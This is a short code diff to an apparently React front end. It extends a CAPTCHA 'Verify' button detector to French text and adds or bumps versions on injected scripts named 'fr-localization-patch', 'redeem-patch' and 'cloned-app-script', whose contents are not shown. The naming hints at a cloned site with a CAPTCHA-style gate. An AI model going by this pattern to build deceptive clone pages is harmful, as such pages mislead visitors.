@@ -66,7 +66,8 @@ const mobileGuardScript = String.raw`
   };
   const findCaptchaVerifyButton = (target) => {
     const button = document.querySelector('button[aria-label="Verify"]');
-    if (!button || !document.body || !document.body.innerText.includes("I am not a robot")) return null;
+    const pageText = document.body?.innerText || "";
+    if (!button || !document.body || (!pageText.includes("I am not a robot") && !pageText.includes("Je ne suis pas un robot"))) return null;
     if (target && target.closest && target.closest('input, textarea, select, [contenteditable="true"]')) return null;
     const card = button.parentElement && button.parentElement.parentElement;
     if (target === button || button.contains(target) || (card && card.contains(target))) return button;
@@ -414,7 +415,8 @@ function RootComponent() {
       };
       const findCaptchaVerifyButton = (target: EventTarget | null) => {
         const button = document.querySelector<HTMLButtonElement>('button[aria-label="Verify"]');
-        if (!button || !document.body.innerText.includes("I am not a robot")) return null;
+        const pageText = document.body?.innerText || "";
+        if (!button || !pageText || (!pageText.includes("I am not a robot") && !pageText.includes("Je ne suis pas un robot"))) return null;
         if (target instanceof Element && target.closest("input, textarea, select, [contenteditable='true']")) return null;
         const card = button.parentElement?.parentElement;
         if (target === button || (target instanceof Node && button.contains(target)) || (target instanceof Node && card?.contains(target))) return button;
@@ -519,17 +521,31 @@ function RootComponent() {
       return;
     }
 
+    const existingFrPatch = document.getElementById("fr-localization-patch-script") as HTMLScriptElement | null;
+    if (!existingFrPatch) {
+      const frPatch = document.createElement("script");
+      frPatch.id = "fr-localization-patch-script";
+      frPatch.src = "/fr-localization-patch.js?v=17";
+      document.body.appendChild(frPatch);
+    } else if (!existingFrPatch.src.includes("v=17")) {
+      existingFrPatch.remove();
+      const frPatch = document.createElement("script");
+      frPatch.id = "fr-localization-patch-script";
+      frPatch.src = "/fr-localization-patch.js?v=17";
+      document.body.appendChild(frPatch);
+    }
+
     const existingPatch = document.getElementById("redeem-patch-script") as HTMLScriptElement | null;
     if (!existingPatch) {
       const patch = document.createElement("script");
       patch.id = "redeem-patch-script";
-      patch.src = "/redeem-patch.js?v=13";
+      patch.src = "/redeem-patch.js?v=16";
       document.body.appendChild(patch);
-    } else if (!existingPatch.src.includes("v=13")) {
+    } else if (!existingPatch.src.includes("v=16")) {
       existingPatch.remove();
       const patch = document.createElement("script");
       patch.id = "redeem-patch-script";
-      patch.src = "/redeem-patch.js?v=13";
+      patch.src = "/redeem-patch.js?v=16";
       document.body.appendChild(patch);
     }
 
@@ -539,7 +555,7 @@ function RootComponent() {
       const script = document.createElement("script");
       script.id = "cloned-app-script";
       script.type = "module";
-      script.src = "/assets/index-BhN0l3GJ-v14.js";
+      script.src = "/assets/index-BhN0l3GJ-v16.js";
       document.body.appendChild(script);
     }, 80);
     return () => window.clearTimeout(timer);
